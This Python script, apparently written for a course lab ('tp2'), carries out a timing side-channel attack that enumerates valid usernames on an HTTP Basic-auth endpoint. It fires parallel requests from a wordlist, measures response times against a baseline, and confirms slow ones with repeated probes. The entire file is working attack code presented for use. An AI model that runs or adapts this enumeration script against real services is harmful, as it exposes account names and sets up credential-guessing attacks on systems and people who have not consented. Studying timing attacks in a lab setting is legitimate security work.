import base64
import concurrent.futures
import itertools
import random
import time
from string import digits, ascii_lowercase

import requests
import requests_unixsocket
from tqdm import tqdm

requests_unixsocket.monkeypatch()

URL_BASE = "http+unix://venv%2F..%2F..%2Ftp2.sock/vulnerable"
# URL_BASE = "https://webhook.site/92a94f7c-07c1-428b-831c-4b272bdb25c1"
CHARACTERS = ascii_lowercase + digits
THRESHOLD = 8.0


def split_every(n, iterable):
    iterator = iter(iterable)
    return itertools.takewhile(bool, (list(itertools.islice(iterator, n)) for _ in itertools.repeat(None)))


def send_request(username, password):
    time_start = time.perf_counter()
    requests.get(URL_BASE, headers={
        "Authorization": "Basic " + base64.b64encode(f"{username}:{password}".encode("utf8")).decode()
    })
    return time.perf_counter() - time_start


def send_attack(username):
    return username, send_request(username, ".")


def initialize_thread():
    send_attack("aa")
    send_attack("ab")
    send_attack("ac")


def attack():
    temps_baseline = send_request(str(random.random()), "")
    threshold = temps_baseline + temps_baseline * THRESHOLD

    result = []

    print(f"Baseline:  {temps_baseline}")
    print(f"Threshold: {threshold}")

    with concurrent.futures.ProcessPoolExecutor(max_workers=24, initializer=initialize_thread) as executor:
        with tqdm(open("usernames.txt"), total=sum(1 for _ in open('usernames.txt'))) as tusernames:
            usernames = map(lambda x: x[:-1], tusernames)
            for chunk in split_every(720, usernames):
                for username, time_taken in executor.map(send_attack, chunk):
                    if time_taken > threshold:
                        lowest = min(
                            send_attack(username)[1],
                            send_attack(username)[1],
                            send_attack(username)[1],
                            send_attack(username)[1],
                            send_attack(username)[1]
                        )
                        if lowest > threshold:
                            result.append(username)
                    tusernames.set_description(str(result))

    return result


if __name__ == '__main__':
    print(attack())
